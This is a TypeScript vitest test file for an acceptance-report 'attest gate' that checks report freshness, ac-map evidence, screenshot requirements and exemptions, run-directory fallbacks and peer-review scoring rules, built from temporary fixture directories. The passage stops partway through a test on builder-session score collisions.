/**
 * FIX-207 — acceptance-report (attest) gate.
 *
 * Runtime mechanism (executor capture step), not skill text: agent-agnostic,
 * fires on every actual delivery. A delivery with no fresh acceptance report
 * leaves an auditable ALERT + `attest:gate` event. Hard by default; policy can
 * explicitly downgrade to soft for migration windows.
 */
import { execSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, utimesSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterAll, describe, expect, it, vi } from "vitest";
import { acBlockPresentInSpec, evidenceGateBeforePush } from "@roll/core";
import {
  DuplicateStoryIdError,
  acMapCandidates,
  MUST_DECLARE_FAIL_REASON,
  allowedDeliverableCmd,
  declaresAnySurface,
  deliverableCmdsForStory,
  deliverableUrlsForStory,
  findDuplicateBacklogStoryIds,
  findDuplicateStoryIds,
  designContractDeliveredEvidence,
  evidencePathsUnresolved,
  readAttestGateMode,
  rejectedDeliverableCmdsForStory,
  runAttestGate,
  screenshotExemption,
  storyHasAcBlock,
  storyRequiresScreenshot,
  storySpecMatches,
  storySpecPath,
  verificationReportFresh,
  verificationReportHasContent,
  verificationReportPath,
  violatesMustDeclareSurface,
  webCaptureTargetForStory,
  webCaptureTargetsForStory,
} from "../src/runner/attest-gate.js";

const dirs: string[] = [];
afterAll(() => {
  for (const d of dirs) execSync(`rm -rf '${d}'`);
});

function tmp(tag: string): string {
  const d = realpathSync(mkdtempSync(join(tmpdir(), `roll-207-${tag}-`)));
  dirs.push(d);
  return d;
}

/**
 * Write a CONTENT-BEARING <ID>-report.html (≥1 AC section) + an ac-map under
 * the CARD layout (US-META-002c: the single home — the fixture carries no
 * index.json, so cardArchiveDir falls back to `uncategorized`); return the
 * worktree root. A real delivery has both — the empty-shell case is exercised
 * separately by {@link withEmptyShell}.
 *
 * FIX-309: a screenshot is the BASELINE for every (non-exempt) story, so the
 * default body carries a real `<figure class="shot">` — a generic real delivery
 * now MUST present captured visual evidence (the screenshot-floor cases that
 * deliberately use text-only / claimed-only evidence pass their own `body`).
 */
function withReport(
  storyId: string,
  mtimeSec?: number,
  body = '<div class="ev ev-text">proof</div><figure class="shot"><img src="screenshots/p.png"></figure>',
  // US-V4-001: the gate now reads STRUCTURED truth (ac-map.json), not the rendered
  // HTML. The default fixture is a generic real delivery — one pass AC backed by a
  // screenshot — so it clears both the content floor and the visual floor. Tests
  // that exercise text-only / claimed / empty scenarios pass their own `acMap`
  // (or call writeAcMap afterward).
  acMap: unknown = [{ ac: `${storyId}:AC1`, status: "pass", evidence: [{ kind: "screenshot", label: "p", href: "screenshots/p.png" }] }],
): string {
  const wt = tmp("wt");
  const storyDir = join(wt, ".roll", "features", "uncategorized", storyId);
  const dir = join(storyDir, "latest");
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(storyDir, "ac-map.json"), JSON.stringify(acMap, null, 2) + "\n");
  writeReferencedEvidenceFiles(storyDir, dir, acMap);
  const p = join(dir, `${storyId}-report.html`);
  writeFileSync(p, `<html><body><section class="ac s-pass" id="${storyId}:AC1">${body}</section></body></html>\n`);
  if (mtimeSec !== undefined) utimesSync(p, mtimeSec, mtimeSec);
  return wt;
}

/** A report under a real epic card directory, with no spec.md/index/backlog.
 *  This mirrors partial cycle worktrees that carry only card artifacts. */
function withPartialEpicReport(storyId: string, epic: string, mtimeSec?: number): string {
  const wt = tmp("partial-epic");
  const storyDir = join(wt, ".roll", "features", epic, storyId);
  const dir = join(storyDir, "latest");
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(storyDir, "ac-map.json"),
    JSON.stringify([{ ac: `${storyId}:AC1`, status: "pass", evidence: [{ kind: "screenshot", href: "screenshots/p.png" }] }], null, 2) +
      "\n",
  );
  const p = join(dir, `${storyId}-report.html`);
  writeFileSync(p, `<html><body><section class="ac s-pass" id="${storyId}:AC1">proof</section></body></html>\n`);
  if (mtimeSec !== undefined) utimesSync(p, mtimeSec, mtimeSec);
  return wt;
}

/** A pass AC backed only by TEXT evidence (no screenshot) — clears the content
 *  floor but NOT the visual floor for a non-exempt story. */
function textOnlyAcMap(storyId: string): unknown {
  return [{ ac: `${storyId}:AC1`, status: "pass", evidence: [{ kind: "text", label: "log", textFile: "evidence/proof.txt" }] }];
}

/** A claimed-only AC (no evidence) — fails the content floor (empty shell). */
function claimedAcMap(storyId: string): unknown {
  return [{ ac: `${storyId}:AC1`, status: "claimed" }];
}

function writeAcMap(wt: string, storyId: string, body: unknown): void {
  const storyDir = join(wt, ".roll", "features", "uncategorized", storyId);
  const runDir = join(storyDir, "latest");
  writeFileSync(join(storyDir, "ac-map.json"), JSON.stringify(body, null, 2) + "\n");
  writeReferencedEvidenceFiles(storyDir, runDir, body);
}

function writeEvidenceJson(wt: string, storyId: string, body: unknown): void {
  writeFileSync(join(wt, ".roll", "features", "uncategorized", storyId, "latest", "evidence.json"), JSON.stringify(body, null, 2) + "\n");
}

function writeReferencedEvidenceFiles(storyDir: string, runDir: string, acMap: unknown): void {
  if (!Array.isArray(acMap)) return;
  for (const entry of acMap) {
    if (typeof entry !== "object" || entry === null) continue;
    const evidence = (entry as { evidence?: unknown }).evidence;
    if (!Array.isArray(evidence)) continue;
    for (const ev of evidence) {
      if (typeof ev !== "object" || ev === null) continue;
      const row = ev as { href?: unknown; textFile?: unknown };
      const ref = typeof row.textFile === "string" ? row.textFile : typeof row.href === "string" ? row.href : "";
      if (ref === "" || /^https?:\/\//i.test(ref)) continue;
      const target = join(ref.startsWith("../") ? runDir : storyDir, ref);
      mkdirSync(dirname(target), { recursive: true });
      writeFileSync(target, "evidence\n");
    }
  }
}

/**
 * FIX-343 (step ③, OWNER B-decision): the gate now honors ONLY an INDEPENDENT
 * fresh-session PEER score (`scoring: pair` + a `scored-by` + a `session-id`
 * that is NOT the builder's session id). Legacy notes are exercised separately
 * by {@link withLegacySelfNote} (a legacy `scoring: self` note, tolerated on
 * read but never gating); the builder's own session is exercised by the
 * session-collision guard test.
 *
 * FIX-343 (① STRICT cycle-scope): the gate now ALSO requires the honored note's
 * `session-id` to start with `${cycleId}:` — the production scorer mints
 * `${cycleId}:score:${peer}:a1:${now}` (runScorePairing). The helper therefore
 * takes the CYCLE id and defaults the session to that cycle-scoped shape so a
 * fixture's score is honored by the gate run for the SAME cycle. The
 * prior-cycle staleness case passes an explicit OLD-cycle `sessionId`.
 */
function withPeerScore(
  wt: string,
  storyId: string,
  score: number,
  verdict: "good" | "ok" | "regression",
  cycleId: string,
  scoredBy = "pi",
  sessionId = `${cycleId}:score:${scoredBy}:a1:1700000000`,
): void {
  const dir = join(wt, ".roll", "features", "uncategorized", storyId, "notes");
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(dir, `2026-06-08-roll-build-${storyId}-${score}.md`),
    [
      "---",
      "skill: roll-build",
      `story: ${storyId}`,
      `score: ${score}`,
      `verdict: ${verdict}`,
      "ts: 2026-06-08T12:00:00Z",
      "scoring: pair",
      `scored-by: ${scoredBy}`,
      `session-id: ${sessionId}`,
      "---",
      "",
      "peer review rationale 首句。",
    ].join("\n"),
  );
}

/** A LEGACY self note (`scoring: self`, no scored-by) — tolerated on read, but
 *  the gate must NEVER honor it (peer-only). */
function withLegacySelfNote(wt: string, storyId: string, score: number, verdict: "good" | "ok" | "regression"): void {
  const dir = join(wt, ".roll", "features", "uncategorized", storyId, "notes");
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(dir, `2026-06-08-roll-build-${storyId}-${score}.md`),
    [
      "---",
      "skill: roll-build",
      `story: ${storyId}`,
      `score: ${score}`,
      `verdict: ${verdict}`,
      "ts: 2026-06-08T12:00:00Z",
      "---",
      "",
      "自评理由首句。",
    ].join("\n"),
  );
}

/** A fresh report that is an EMPTY SHELL: parseable but zero AC content, no ac-map. */
function withEmptyShell(storyId: string, mtimeSec: number): string {
  const wt = tmp("shell");
  const dir = join(wt, ".roll", "features", "uncategorized", storyId, "latest");
  mkdirSync(dir, { recursive: true });
  const p = join(dir, `${storyId}-report.html`);
  writeFileSync(p, "<html><body><h1>no ACs here</h1></body></html>\n");
  utimesSync(p, mtimeSec, mtimeSec);
  return wt;
}

function sinks(): {
  alerts: string[];
  events: Array<{ cycleId: string; verdict: string; reasons: string[] }>;
  s: { alert: (m: string) => void; event: (p: { cycleId: string; verdict: "produced" | "skipped"; reasons: string[] }) => void };
} {
  const alerts: string[] = [];
  const events: Array<{ cycleId: string; verdict: string; reasons: string[] }> = [];
  return { alerts, events, s: { alert: (m) => alerts.push(m), event: (p) => events.push(p) } };
}

describe("verificationReportFresh", () => {
  it("present + within cycle → fresh; absent → not", () => {
    const wt = withReport("FIX-300", 2000);
    expect(verificationReportFresh(wt, "FIX-300", 1000)).toBe(true); // mtime 2000 ≥ start 1000
    expect(verificationReportFresh(wt, "FIX-300")).toBe(true); // no bound → existence
    expect(verificationReportFresh(wt, "FIX-301", 1000)).toBe(false); // other story absent
    expect(verificationReportFresh(tmp("empty"), "FIX-300", 1000)).toBe(false);
  });

  it("finds reports in a live epic card directory even when spec/index are absent", () => {
    const wt = withPartialEpicReport("US-OBS-035", "loop-observability", 2000);
    expect(verificationReportPath(wt, "US-OBS-035")).toBe(
      join(wt, ".roll", "features", "loop-observability", "US-OBS-035", "latest", "US-OBS-035-report.html"),
    );
    expect(verificationReportFresh(wt, "US-OBS-035", 1000)).toBe(true);
  });

  it("stale report (mtime before cycle start) → not fresh", () => {
    const wt = withReport("FIX-302", 500);
    expect(verificationReportFresh(wt, "FIX-302", 1000)).toBe(false); // 500 < 1000
  });

  it("empty storyId is never fresh", () => {
    expect(verificationReportFresh(tmp("x"), "", 1)).toBe(false);
  });
});

describe("verificationReportHasContent (US-ATTEST-012 content floor)", () => {
  it("report with ≥1 positive AC section + ac-map + evidence ref → has content", () => {
    const wt = withReport("FIX-320", 2000);
    expect(verificationReportHasContent(wt, "FIX-320")).toBe(true);
  });

  it("FIX-1230: pass-with-evidence is content-bearing when its evidence resolves", () => {
    const wt = withReport("FIX-1230P", 2000, "<!-- structured truth wins -->", [
      {
        ac: "FIX-1230P:AC1",
        status: "pass-with-evidence",
        evidence: [{ kind: "screenshot", label: "harness evidence", href: "screenshots/p.png" }],
      },
    ]);
    expect(verificationReportHasContent(wt, "FIX-1230P")).toBe(true);
  });

  it("US-EVID-019: positive AC evidence must resolve to files in the evidence tree", () => {
    const wt = withReport("US-EVID-MISS", 2000);
    writeFileSync(
      join(wt, ".roll", "features", "uncategorized", "US-EVID-MISS", "ac-map.json"),
      JSON.stringify(
        [
          {
            ac: "US-EVID-MISS:AC1",
            status: "pass",
            evidence: [{ kind: "screenshot", label: "missing shot", href: "screenshots/missing.png" }],
          },
        ],
        null,
        2,
      ) + "\n",
    );
    expect(evidencePathsUnresolved(wt, "US-EVID-MISS")).toEqual(["US-EVID-MISS:AC1 screenshots/missing.png"]);
    expect(verificationReportHasContent(wt, "US-EVID-MISS")).toBe(false);
  });

  it("US-EVID-019 R2: arbitrary http evidence links are unresolved", () => {
    const wt = withReport("US-EVID-HTTP", 2000, '<div class="ev ev-ci">ci</div>', [
      { ac: "US-EVID-HTTP:AC1", status: "pass", evidence: [{ kind: "ci", label: "CI", href: "https://ci.example.test/run/1" }] },
    ]);
    expect(evidencePathsUnresolved(wt, "US-EVID-HTTP")).toEqual(["US-EVID-HTTP:AC1 https://ci.example.test/run/1"]);
  });

  it("US-EVID-019 R2: this repo's GitHub pull/commit/checks URLs are resolvable", () => {
    const wt = withReport("US-EVID-GH", 2000, '<div class="ev ev-ci">ci</div>', [
      { ac: "US-EVID-GH:AC1", status: "pass", evidence: [
        { kind: "ci", label: "PR", href: "https://github.com/owner/repo/pull/1189" },
        { kind: "commit", label: "commit", href: "https://github.com/owner/repo/commit/abcdef123456" },
        { kind: "ci", label: "checks", href: "https://github.com/owner/repo/checks/123" },
      ] },
    ]);
    execSync("git init -q && git remote add origin https://github.com/owner/repo.git", { cwd: wt });
    expect(evidencePathsUnresolved(wt, "US-EVID-GH")).toEqual([]);
  });

  it("empty shell (parseable but zero AC, no ac-map) → NO content (FIX-214)", () => {
    const wt = withEmptyShell("FIX-321", 2000);
    expect(verificationReportHasContent(wt, "FIX-321")).toBe(false);
  });

  it("absent report → no content", () => {
    expect(verificationReportHasContent(tmp("none"), "FIX-322")).toBe(false);
  });

  it("pure claimed / zero evidence report → NO content", () => {
    const wt = withReport("FIX-323", 2000, "statement only", claimedAcMap("FIX-323"));
    expect(verificationReportHasContent(wt, "FIX-323")).toBe(false);
  });

  it("interactive story requires screenshot evidence or a machine capture skip", () => {
    const noShot = withReport("FIX-CLI", 2000, '<div class="ev ev-text">text proof only</div>', textOnlyAcMap("FIX-CLI"));
    writeFileSync(join(noShot, ".roll", "features", "uncategorized", "FIX-CLI", "spec.md"), "**AC:**\n- [ ] CLI shows output\n");
    expect(verificationReportHasContent(noShot, "FIX-CLI")).toBe(false);

    // FIX-339 (AC6): a non-exempt card must DECLARE its surface. A web card with a
    // declared deliverable_url + a real web capture passes.
    const withShot = withReport("FIX-WEB", 2000, '<figure class="shot"><img src="screenshots/home.png"></figure>');
    writeFileSync(
      join(withShot, ".roll", "features", "uncategorized", "FIX-WEB", "spec.md"),
      "---\nid: FIX-WEB\ndeliverable_url: https://app.test/home\n---\n**AC:**\n- [ ] web screen renders\n",
    );
    writeEvidenceJson(withShot, "FIX-WEB", { captures: [{ kind: "web", out: "screenshots/home.png", taken: true }] });
    expect(verificationReportHasContent(withShot, "FIX-WEB")).toBe(true);

    // A genuinely non-capturable TUI in headless CI takes the recorded exemption
    // path (the honest machine-skip lane); an exempt card owes no real capture.
    const withSkip = withReport("FIX-TUI", 2000, '<div class="ev ev-text">{"taken":false,"skipped":"no GUI session"}</div>');
    writeFileSync(
      join(withSkip, ".roll", "features", "uncategorized", "FIX-TUI", "spec.md"),
      "---\nid: FIX-TUI\nscreenshot_exempt: headless CI — no GUI session to capture the TUI\n---\n**AC:**\n- [ ] TUI can be inspected\n",
    );
    writeEvidenceJson(withSkip, "FIX-TUI", {
      captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: false, skipped: "no GUI session" }],
    });
    expect(verificationReportHasContent(withSkip, "FIX-TUI")).toBe(true);
  });

  it("FIX-261/FIX-258: modern Acceptance Criteria makes CLI text-only reports fail the screenshot floor", () => {
    const noShot = withReport("FIX-MODERN", 2000, '<div class="ev ev-text">text proof only</div>', textOnlyAcMap("FIX-MODERN"));
    writeFileSync(
      join(noShot, ".roll", "features", "uncategorized", "FIX-MODERN", "spec.md"),
      "# FIX-MODERN\n\n## Acceptance Criteria\n\n- [ ] CLI output can be inspected\n",
    );
    expect(storyHasAcBlock(noShot, "FIX-MODERN")).toBe(true);
    expect(verificationReportHasContent(noShot, "FIX-MODERN")).toBe(false);
  });

  it("FIX-258: pass ACs backed only by text evidence fail the screenshot evidence floor", () => {
    const wt = withReport("FIX-TEXT", 2000);
    writeAcMap(wt, "FIX-TEXT", [
      { ac: "FIX-TEXT:AC1", status: "pass", evidence: [{ kind: "text", label: "log", textFile: "evidence/proof.txt" }] },
    ]);
    expect(verificationReportHasContent(wt, "FIX-TEXT")).toBe(false);
  });

  it("FIX-258: pass ACs with screenshot evidence satisfy the visual floor", () => {
    const wt = withReport("FIX-SHOT", 2000, '<figure class="shot"><img src="screenshots/terminal.png"></figure>');
    writeAcMap(wt, "FIX-SHOT", [
      { ac: "FIX-SHOT:AC1", status: "pass", evidence: [{ kind: "screenshot", label: "terminal", href: "screenshots/terminal.png" }] },
    ]);
    expect(verificationReportHasContent(wt, "FIX-SHOT")).toBe(true);
  });

  it("FIX-258: machine capture skip is accepted as an honest degraded visual fact", () => {
    const wt = withReport("FIX-SKIP", 2000);
    writeAcMap(wt, "FIX-SKIP", [
      { ac: "FIX-SKIP:AC1", status: "pass", evidence: [{ kind: "text", label: "log", textFile: "evidence/proof.txt" }] },
    ]);
    writeEvidenceJson(wt, "FIX-SKIP", {
      captures: [{ kind: "terminal", out: "screenshots/terminal.png", taken: false, skipped: "not macOS" }],
    });
    expect(verificationReportHasContent(wt, "FIX-SKIP")).toBe(true);
  });

  // FIX-345 — a `screenshot_exempt` validator/back-end card discharges its pass
  // ACs with TEXT-ONLY evidence (test logs), no deliverable_url/_cmd and no
  // machine-capture skip recorded. The real FIX-341 e2e cycle was false-
  // empty-shelled here: a COMPLETE report (4 pass AC sections + ev refs + a
  // real ac-map) read as content-less ONLY because the visual floor demanded a
  // per-AC screenshot the exempt card never owed. The fix short-circuits the
  // pass-AC screenshot floor for an exempt card (it already owes no captured
  // evidence). The empty-shell FLOOR is NOT weakened — see the two follow-ons.
  it("FIX-345: an EXEMPT card with text-only PASS ac-map entries (the FIX-341 shape) → has content", () => {
    const wt = withReport("FIX-341X", 2000, '<div class="ev ev-text">focused validator tests</div>');
    writeFileSync(
      join(wt, ".roll", "features", "uncategorized", "FIX-341X", "spec.md"),
      "---\nid: FIX-341X\nscreenshot_exempt: validator card, no user-visible surface; verified by unit tests\n---\n# FIX-341X\n\n## Acceptance Criteria\n\n- [ ] recognizes path A\n- [ ] recognizes path B\n",
    );
    writeAcMap(wt, "FIX-341X", [
      { ac: "FIX-341X:AC1", status: "pass", evidence: [{ kind: "text", label: "focused tests", textFile: "evidence/vitest.txt" }] },
      { ac: "FIX-341X:AC2", status: "pass", evidence: [{ kind: "text", label: "validate scan", textFile: "evidence/scan.txt" }] },
    ]);
    expect(storyRequiresScreenshot(wt, "FIX-341X")).toBe(false);
    expect(verificationReportHasContent(wt, "FIX-341X")).toBe(true);
  });

  it("FIX-345: an EXEMPT card with fixture-card siblings present is still not false-empty-shelled (validator card does not corrupt its OWN attest read)", () => {
    // The FIX-341 validator card's build created fixture cards (FIX-300/902/WEB)
    // and ran `roll story validate` on many cards, leaving fixture-card REPORTS
    // siblings inside the SAME latest/ dir. The main card's own attest read must
    // be robust to that pollution — its own complete report + ac-map still count.
    const wt = withReport("FIX-341Y", 2000, '<div class="ev ev-text">validator passes</div>');
    const latest = join(wt, ".roll", "features", "uncategorized", "FIX-341Y", "latest");
    // fixture-card report siblings dropped into the main card's latest/ dir
    writeFileSync(join(latest, "FIX-FIXTURE-A-report.html"), "<html><body><h1>fixture A</h1></body></html>\n");
    writeFileSync(join(latest, "FIX-FIXTURE-B-report.html"), "<html><body><h1>fixture B</h1></body></html>\n");
    writeFileSync(
      join(wt, ".roll", "features", "uncategorized", "FIX-341Y", "spec.md"),
      "---\nid: FIX-341Y\nscreenshot_exempt: validator card; recognition logic, no visible surface\n---\n# FIX-341Y\n\n## Acceptance Criteria\n\n- [ ] x\n",
    );
    writeAcMap(wt, "FIX-341Y", [
      { ac: "FIX-341Y:AC1", status: "pass", evidence: [{ kind: "text", label: "tests", textFile: "evidence/proof.txt" }] },
    ]);
    expect(verificationReportHasContent(wt, "FIX-341Y")).toBe(true);
  });

  it("FIX-345 (RED LINE): a GENUINELY empty EXEMPT report is STILL blocked — the empty-shell floor is not weakened", () => {
    // exempt, but the report HTML carries zero AC sections (a real empty shell)
    const wt = tmp("ex-empty");
    const cardDir = join(wt, ".roll", "features", "uncategorized", "FIX-341Z");
    mkdirSync(join(cardDir, "latest"), { recursive: true });
    writeFileSync(
      join(cardDir, "spec.md"),
      "---\nid: FIX-341Z\nscreenshot_exempt: validator card, no visible surface\n---\n# FIX-341Z\n\n## Acceptance Criteria\n\n- [ ] x\n",
    );
    writeFileSync(join(cardDir, "latest", "FIX-341Z-report.html"), "<html><body><h1>no ACs here</h1></body></html>\n");
    writeFileSync(join(cardDir, "ac-map.json"), "[]\n");
    expect(storyRequiresScreenshot(wt, "FIX-341Z")).toBe(false);
    expect(verificationReportHasContent(wt, "FIX-341Z")).toBe(false); // zero AC sections → still empty shell

    // exempt + content-bearing report but NO ac-map → still blocked (no AI intent layer)
    const wt2 = tmp("ex-noacmap");
    const cardDir2 = join(wt2, ".roll", "features", "uncategorized", "FIX-341W");
    mkdirSync(join(cardDir2, "latest"), { recursive: true });
    writeFileSync(
      join(cardDir2, "spec.md"),
      "---\nid: FIX-341W\nscreenshot_exempt: validator card, no visible surface\n---\n# FIX-341W\n\n## Acceptance Criteria\n\n- [ ] x\n",
    );
    writeFileSync(
      join(cardDir2, "latest", "FIX-341W-report.html"),
      '<html><body><section class="ac s-pass" id="FIX-341W:AC1"><div class="ev ev-text">proof</div></section></body></html>\n',
    );
    // deliberately no ac-map.json written
    expect(verificationReportHasContent(wt2, "FIX-341W")).toBe(false); // no ac-map → still empty shell
  });

  it("FIX-345 (RED LINE): a NON-exempt card with text-only PASS ACs still fails the screenshot floor", () => {
    const wt = withReport("FIX-341N", 2000, '<div class="ev ev-text">text proof only</div>');
    writeFileSync(
      join(wt, ".roll", "features", "uncategorized", "FIX-341N", "spec.md"),
      "# FIX-341N\n\n## Acceptance Criteria\n\n- [ ] CLI output can be inspected\n",
    );
    writeAcMap(wt, "FIX-341N", [
      { ac: "FIX-341N:AC1", status: "pass", evidence: [{ kind: "text", label: "log", textFile: "evidence/proof.txt" }] },
    ]);
    expect(storyRequiresScreenshot(wt, "FIX-341N")).toBe(true); // not exempt → still owes capture
    expect(verificationReportHasContent(wt, "FIX-341N")).toBe(false);
  });

  // US-V4-001 (no-HTML-parsing red line): the content gate is a MACHINE DECISION
  // over structured truth (ac-map.json), never the rendered HTML report. These two
  // tests deliberately MISMATCH the HTML and the ac-map to prove the gate follows
  // the structured data and ignores the HTML body.
  it("US-V4-001: a report whose HTML has NO evidence markup still has content when the ac-map does (structured wins)", () => {
    // The HTML body carries no `class="ev"` / `class="shot"` markup — the old
    // HTML-scanning gate would have called this an empty shell. The structured
    // ac-map declares a pass AC with a screenshot, so the gate sees content.
    const wt = withReport("FIX-STRUCT", 2000, "<!-- pure noise, no evidence markup -->", [
      { ac: "FIX-STRUCT:AC1", status: "pass", evidence: [{ kind: "screenshot", label: "p", href: "screenshots/p.png" }] },
    ]);
    expect(verificationReportHasContent(wt, "FIX-STRUCT")).toBe(true);
  });

  it("US-V4-001: rich HTML AC sections with an EMPTY ac-map have NO content (HTML is ignored)", () => {
    // The default rich HTML body has a `s-pass` section with `class="ev"` + a
    // `<figure class="shot">` — the old gate would have passed it. With an empty
    // ac-map there is no structured content, so the gate fails it.
    const wt = withReport("FIX-NOACMAP", 2000, undefined, []);
    expect(verificationReportHasContent(wt, "FIX-NOACMAP")).toBe(false);
  });
});

// ── FIX-400 helpers ────────────────────────────────────────────

/**
 * Write a CONTENT-BEARING <ID>-report.html + ac-map into a TIMESTAMPED RUN
 * DIRECTORY (not latest/) under the card archive, simulating what the executor
 * does via openEvidenceFrame. Returns [worktree, reportPath].
 */
function withRunDirReport(
  storyId: string,
  runDirName: string,
  mtimeSec?: number,
  body = '<div class="ev ev-text">proof</div><figure class="shot"><img src="screenshots/p.png"></figure>',
): [string, string] {
  const wt = tmp("rundir");
  const reportPath = writeRunDirReport(wt, storyId, runDirName, mtimeSec, body);
  return [wt, reportPath];
}

function writeRunDirReport(
  wt: string,
  storyId: string,
  runDirName: string,
  mtimeSec?: number,
  body = '<div class="ev ev-text">proof</div><figure class="shot"><img src="screenshots/p.png"></figure>',
): string {
  const cardDir = join(wt, ".roll", "features", "uncategorized", storyId);
  const runDir = join(cardDir, runDirName);
  mkdirSync(runDir, { recursive: true });
  const reportPath = join(runDir, `${storyId}-report.html`);
  writeFileSync(reportPath, `<html><body><section class="ac s-pass" id="${storyId}:AC1">${body}</section></body></html>\n`);
  if (mtimeSec !== undefined) utimesSync(reportPath, mtimeSec, mtimeSec);
  return reportPath;
}

function withRunDirAcMap(wt: string, storyId: string, runDirName: string, body: unknown): void {
  const storyDir = join(wt, ".roll", "features", "uncategorized", storyId);
  const runDir = join(storyDir, runDirName);
  const p = join(runDir, "ac-map.json");
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, JSON.stringify(body, null, 2) + "\n");
  writeReferencedEvidenceFiles(storyDir, runDir, body);
}

describe("FIX-400 — run-dir fallback for report / ac-map candidates", () => {
  it("AC1: no latest/ symlink but run dir has report → verificationReportFresh & existingReport find it", () => {
    // Scenario: executor wrote report into a timestamped run dir, and latest/
    // symlink was never created (best-effort failure). The gate must still
    // find the report via run-dir fallback.
    const [wt] = withRunDirReport("FIX-400A", "20260624-110904-79182", 2000);
    // No latest/ dir at all — only the run dir exists.
    expect(verificationReportFresh(wt, "FIX-400A", 1000)).toBe(true);
    expect(verificationReportFresh(wt, "FIX-400A")).toBe(true);
  });

  it("AC1: latest/ present (has priority), run dir also present → picks latest/", () => {
    // When latest/ symlink IS present, it should be the primary candidate.
    // The run-dir is a fallback, not a replacement.
    const wt = withReport("FIX-400B", 3000);
    // Also add a run-dir with an older mtime
    writeRunDirReport(wt, "FIX-400B", "20260624-110904-79182", 2000);
    // latest/ exists and is fresher → gate uses latest/
    expect(verificationReportFresh(wt, "FIX-400B", 2500)).toBe(true);
  });

  it("AC2: ac-map only in run dir (not in card root) → verificationReportHasContent finds it", () => {
    const [wt] = withRunDirReport("FIX-400C", "20260624-110904-79182", 2000);
    withRunDirAcMap(wt, "FIX-400C", "20260624-110904-79182", [
      { ac: "FIX-400C:AC1", status: "pass", evidence: [{ kind: "screenshot", label: "term", href: "../screenshots/p.png" }] },
    ]);
    // No ac-map.json in card root; only in the run dir.
    expect(verificationReportHasContent(wt, "FIX-400C")).toBe(true);
  });

  it("AC2: ac-map in card root (legacy, priority) + also in run dir → card-root wins", () => {
    const wt = withReport("FIX-400D", 2000);
    withRunDirAcMap(wt, "FIX-400D", "20260624-110904-79182", []);
    expect(verificationReportHasContent(wt, "FIX-400D")).toBe(true);
  });

  it("AC3: empty shell in BOTH latest/ AND run dir → still fails (no regression)", () => {
    const wt = tmp("shell-both");
    const cardDir = join(wt, ".roll", "features", "uncategorized", "FIX-400E");
    // latest/ empty shell
    mkdirSync(join(cardDir, "latest"), { recursive: true });
    writeFileSync(join(cardDir, "latest", "FIX-400E-report.html"), "<html><body>no ACs</body></html>\n");
    // run dir empty shell
    const runDir = join(cardDir, "20260624-110904-79182");
    mkdirSync(runDir, { recursive: true });
    writeFileSync(join(runDir, "FIX-400E-report.html"), "<html><body>also no ACs</body></html>\n");
    // No ac-map anywhere
    expect(verificationReportHasContent(wt, "FIX-400E")).toBe(false);
  });

  it("AC5: multiple run dirs → picks the one with newest mtime", () => {
    const [wt] = withRunDirReport("FIX-400F", "20260624-000001-older", 1000);
    // Add a newer run dir (no report in it — this tests candidate ordering)
    const cardDir = join(wt, ".roll", "features", "uncategorized", "FIX-400F");
    const newerDir = join(cardDir, "20260625-000001-newer");
    mkdirSync(newerDir, { recursive: true });
    writeFileSync(join(newerDir, "FIX-400F-report.html"), `<html><body><section class="ac s-pass" id="FIX-400F:AC1"><figure class="shot"><img src="screenshots/n.png"></figure></section></body></html>\n`);
    // The older run dir has no ac-map; the newer one does.
    withRunDirAcMap(wt, "FIX-400F", "20260625-000001-newer", [
      { ac: "FIX-400F:AC1", status: "pass", evidence: [{ kind: "screenshot", label: "n", href: "../screenshots/n.png" }] },
    ]);
    // Both run dirs exist, the newer one should be selected for the report.
    expect(verificationReportFresh(wt, "FIX-400F", 500)).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-400F")).toBe(true);
  });

  it("AC5: freshness mtime gate still uses the selected report's mtime (not latest/)", () => {
    const [wt] = withRunDirReport("FIX-400G", "20260624-110904-79182", 500);
    // Report mtime is 500 < cycle start 1000 → stale
    expect(verificationReportFresh(wt, "FIX-400G", 1000)).toBe(false);
  });
});

describe("readAttestGateMode", () => {
  it("no policy → hard; attest_gate: soft → soft", () => {
    expect(readAttestGateMode(tmp("nopol"))).toBe("hard");
    const repo = tmp("repo");
    mkdirSync(join(repo, ".roll"), { recursive: true });
    writeFileSync(join(repo, ".roll", "policy.yaml"), "loop_safety:\n  attest_gate: soft\n");
    expect(readAttestGateMode(repo)).toBe("soft");
  });
});

describe("runAttestGate (three paths: produced / skipped-soft / skipped-hard)", () => {
  it("produced: fresh report → event only, no alert, not blocked", () => {
    const wt = withReport("FIX-310", 2000);
    withPeerScore(wt, "FIX-310", 8, "good", "c-1");
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-310", "c-1", "soft", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events).toEqual([{ cycleId: "c-1", verdict: "produced", reasons: r.reasons }]);
  });

  it("US-EVID-013: missing peer review score is skipped and hard-blocked", () => {
    const wt = withReport("FIX-SCORE-MISSING", 2000);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-MISSING", "c-score-missing", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toMatch(/missing peer review score/i);
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  // FIX-343 (step ②): the gate honors ONLY a fresh-session peer score.
  it("FIX-343: a self/legacy note (no scoring/scored-by) is NOT honored → missing peer review score, hard-blocked", () => {
    const wt = withReport("FIX-SCORE-SELF", 2000);
    withLegacySelfNote(wt, "FIX-SCORE-SELF", 8, "good"); // legacy self note
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-SELF", "c-score-self", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toMatch(/missing peer review score/i);
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("FIX-343 (B-decision): a pair note whose session-id === the BUILDER'S session is NOT honored (in-session/sub-agent self-grade)", () => {
